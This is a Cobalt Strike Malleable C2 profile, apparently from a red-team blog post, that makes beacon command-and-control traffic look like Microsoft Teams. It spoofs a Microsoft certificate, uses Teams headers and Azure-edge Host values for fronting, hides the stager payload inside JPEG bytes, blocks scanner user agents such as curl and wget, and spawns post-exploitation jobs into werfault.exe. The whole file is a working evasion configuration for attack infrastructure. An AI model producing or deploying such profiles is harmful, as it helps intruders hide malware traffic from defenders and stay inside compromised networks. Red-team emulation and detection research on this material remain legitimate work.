#
# Microsoft Teams
# 
# Post: https://www.blackarrow.net/leveraging-microsoft-teams-to-persist-and-cover-up-cobalt-strike-traffic/
# Author: @_mrp314 - @BlackArrowSec
# 

https-certificate {
    set CN       "www.ajax.microsoft.com";
    set O        "Microsoft Corporation";
    set C        "US";
    set L        "Redmond";
    set OU       "Microsoft IT";
    set ST       "WA";
    set validity "365";
}
set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.4.00.2879 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36";
http-get {
    set uri "/Collector/2.0/settings/";
    client {
        header "Accept" "json";
        header "Host" "westeurope-teams.azureedge.net";
        header "Referer" "https://teams.microsoft.com/_";
        header "x-ms-session-id" "f73c3186-057a-d996-3b63-b6e5de6ef20c";
        header "x-ms-client-type" "desktop";
        header "x-mx-client-version" "27/1.0.0.2021020410";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Origin" "https://teams.microsoft.com";
        parameter "qsp" "true";
        parameter "client-id" "NO_AUTH";
            metadata {
                base64url;
                parameter "events";
            }
        parameter "sdk-version" "ACT-Web-JS-2.5.0&";
        }   
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Server" "Microsoft-HTTPAPI/2.0";
        header "X-Content-Type-Options" "nosniff";
        header "x-ms-environment" "North Europe-prod-3,_cnsVMSS-6_26";
        header "x-ms-latency" "40018.2038";
        header "Access-Control-Allow-Origin" "https://teams.microsoft.com";
        header "Access-Control-Allow-Credentials" "true";
        header "Connection" "keep-alive";
        output {
            netbios;
            prepend "{\"next\":\"https://westeurope-prod-3.notifications.teams.microsoft.com/users/8:orgid:a17481c3-f754-4d06-9730-4eb0be94afc3/endpoints/";
            append "/events/poll?cursor=1613554385&epfs=srt&sca=4}";
            print;
        }
    }
}
http-post {
    set uri "/users/8:orgid:b1a28-a1c3-3d54-4eb01adb1/endpoints/events/poll";
    set verb "GET";
    client {
        header "Accept" "json";
        header "Host" "westeurope-teams.azureedge.net";
        header "Referer" "https://teams.microsoft.com/_";
        header "x-ms-query-params" "cursor=1613554385&epfs=srt&sca=5&activeTimeout=135";
        header "x-ms-client-type" "desktop";
        header "x-mx-client-version" "27/1.0.0.2021020410";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Origin" "https://teams.microsoft";
        
        output {
            base64;
            prepend "skypetoken=eyJhbGciOi";
            header "Authentication";      
        }
        id {
            netbios;
            prepend "f73c3186-057a-d996-3b63-";
            header "x-ms-session-id";
        }
    }
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Server" "Microsoft-HTTPAPI/2.0";
        header "X-Content-Type-Options" "nosniff";
        header "x-ms-environment" "North Europe-prod-3,_cnsVMSS-6_26";
        header "x-ms-latency" "40018.2038";
        header "Access-Control-Allow-Origin" "https://teams.microsoft.com";
        header "Access-Control-Allow-Credentials" "true";
        header "Connection" "keep-alive";
            output {
            netbios;
            prepend "{\"next\":\"https://westeurope-prod-3.notifications.teams.microsoft.com/users/8:orgid:a17481c3-f754-4d06-9730-4eb0be94afc3/endpoints/a";
            append "/events/poll?cursor=1613554385&epfs=srt&sca=4}";
            print;
            }
        }
}
http-stager {
    set uri_x86 "/v1/objects/0-neu-d10-ccab474e582c03325f9f07ba8a3aae8a/views/imgo";
    set uri_x64 "/v1/objects/0-neu-d10-cdab424e592c03253f9f07ba8d9aae8a/views/imgo";
    client {
        header "Host" "westeurope-teams.azureedge.net";
        header "x-mx-client-version" "27/1.0.0.2021020410";
        header "Origin" "https://teams.microsoft";
        parameter "v" "1";
    }
    
    server {
        header "Server" "Microsoft-IIS/10.0";
        header "strict-transport-security" "max-age=31536000; includeSubDomains";
        header "X-Powered-By" "ARR/3.0";
        header "X-Content-Type-Options" "nosniff";
        header "x-ms-environment" "North Europe-prod-3,_cnsVMSS-6_26";
        header "x-ms-latency" "40018.2038";
        header "Timing-Allow-Origin" "https://teams.microsoft.com";
        header "Access-Control-Allow-Origin" "https://teams.microsoft.com";
        header "Access-Control-Allow-Credentials" "true";
        header "Connection" "close";
        header "Content-Type" "image/jpeg";
        
        output {
            prepend "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00\x43\x00";
            append "\xF9\x7C\xF3\x4E\x3F\xEC\x7F\x82\x8C\xA4\xB5\x5B\x3E\x64\x11\xE7\xEA\x78\x70\xCD\x6B\xFE\x0E\x1F\xFF\xD9";
            print;
        }
    }
}
http-config {
    set block_useragents "null,*zgrab*,curl*,lynx*,wget*";
}
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\werfault.exe";              
    set spawnto_x64 "%windir%\\sysnative\\werfault.exe";
}